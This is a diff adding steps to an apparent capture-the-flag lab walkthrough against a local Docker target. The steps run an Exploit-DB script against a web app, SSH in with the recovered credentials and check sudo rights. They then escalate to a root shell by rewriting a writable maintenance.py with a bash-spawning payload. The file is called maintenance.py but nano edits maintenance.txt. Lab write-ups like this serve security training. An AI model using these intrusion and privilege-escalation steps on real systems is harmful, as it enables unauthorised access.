@@ -71,8 +71,43 @@ mv /usr/share/exploitdb/exploits/multiple/webapps/50581.py .
 ```
 ![image](https://github.com/user-attachments/assets/6713e0b1-7d88-442f-867e-ef10c611064f)
 
+## **With this new exploit we will start our attack on the website**
+```bash
+python3 50581.py -H http://172.17.0.2:3000
+```
+![image](https://github.com/user-attachments/assets/53cd3a27-a917-4dee-abfd-441e580703b0)
 
+## **Now we have a username and password let's try to login via SSH**
+```bash
+ssh freddy@172.17.0.2
+```
+![image](https://github.com/user-attachments/assets/4c4ce804-d551-4db4-a11b-bc663714a801)
 
+## **We already have access now let's try to elevate privileges**
+```bash
+sudo -l
+```
+![image](https://github.com/user-attachments/assets/99c5b875-47fd-47be-9b3d-c2f31384c21a)
+![image](https://github.com/user-attachments/assets/7d90a92a-2d38-4216-8883-a907c042e7fb)
+
+## **We see that /opt/maintenance.py belongs to freddy so we can change it and write to it. The new content of the maintenance.py script will be:**
+```bash
+script /dev/null -c bash
+"CTRL+Z"
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+```bash
+nano /opt/maintenance.txt
+```
+![image](https://github.com/user-attachments/assets/5b9a60c7-daa2-4800-99db-20d93413e729)
+```bash
+import os
+os.system("/usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'")
+```
+![image](https://github.com/user-attachments/assets/5e3d535d-468c-4247-acba-6564fae86b4b)
 
 
 
